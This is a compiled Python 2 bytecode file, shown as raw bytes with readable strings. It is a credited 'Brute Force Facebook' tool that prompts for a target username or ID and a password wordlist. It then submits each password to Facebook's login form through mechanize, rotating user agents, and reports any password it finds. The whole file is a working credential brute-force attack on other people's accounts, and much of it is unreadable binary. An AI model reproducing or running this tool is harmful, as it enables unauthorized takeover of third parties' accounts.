ó
ÿc           @   sß   e  Z e r# d  d  Z   Z n  d d l Z d d l Z d d l Z d d l Z d d l Z d Z e j	 d  e GHe
 e d   Z e
 e d   Z d Z d g Z d
   Z d   Z d   Z e d k rÛ e   n  d S(   i    iÿÿÿÿNs¼  
[1;91m__________________ 
[1;92m| ___ \  ___|  ___|
[1;93m| |_/ / |_  | |_   
[1;95m| ___ \  _| |  _|  
[1;96m| |_/ / |   | |    
[1;91m\____/\_|   \_|  [1;97mBrute Force Facebook
[1;97m--------------------------------------------
[1;97mâ£ Author   : Angga Kurniawan     
[1;97mâ£ GitHub   : https://github.com/anggaxd
[1;97mâ£ YouTube  : ANGGA KURNIAWAN
[1;97m--------------------------------------------
                     
t   clears    Target Username / ID Facebook : s#   Enter the wordlist name and path : s2   https://www.facebook.com/login.php?login_attempt=1sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0se   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1c          C   s   t  j   a t j   }  t j t  t j t  t j	 |   t j
 t  t j t  t j t  j j   d d t   d GHd  S(   Nt   max_timei   s'   Password does not exist in the wordlist(   t	   mechanizet   Browsert   brt	   cookielibt   LWPCookieJart   set_handle_robotst   Falset   set_handle_redirectt   Truet   set_cookiejart   set_handle_equivt   set_handle_referert   set_handle_refresht   _httpt   HTTPRefreshProcessort   search(   t   cj(    (    s   632448278o.pyt   main   s    c         C   sÖ   t  j j d j |    t  j j   d t j t  f g t _	 t j
 t  } t j d d  t t j d <|  t j d <t j   } | j   } | t k rÒ d | k rÒ d j |   GHt d	  t  j d
  n  d  S(   Ns   [*] Trying ..... {}
s
   User-agentt   nri    t   emailt   passt   login_attempts   

[+] Password Find = {}s   ANY KEY to Exit....i   (   t   syst   stdoutt   writet   formatt   flusht   randomt   choicet
   useragentsR   t
   addheaderst   opent   logint   select_formR   t   formt   submitt   geturlt	   raw_inputt   exit(   t   passwordt   sitet   subt   log(    (    s   632448278o.pyt   brute#   s    
c          C   s   t  t d  }  x* |  D]" a t j d d  a t t  q Wt  t d  } | j   } t GHd j t  GHd Gt	 |  Gd GHd GHd  S(   Nt   rs   
t    s    [*] Account to crack : {}s    [*] Loaded :t	   passwordss     [*] Cracking, please wait ...

(
   R!   t   passwordlistR)   t   replaceR-   t	   readlinest   welR   R   t   len(   R0   t   total(    (    s   632448278o.pyR   3   s    t   __main__(   sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0se   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1(   R   t   foot   bart   osR   R   R   R   t   logot   systemt   strR'   R   R1   R"   R   R   R-   R   t   __name__(    (    (    s   632448278o.pyt   <module>   s    
<				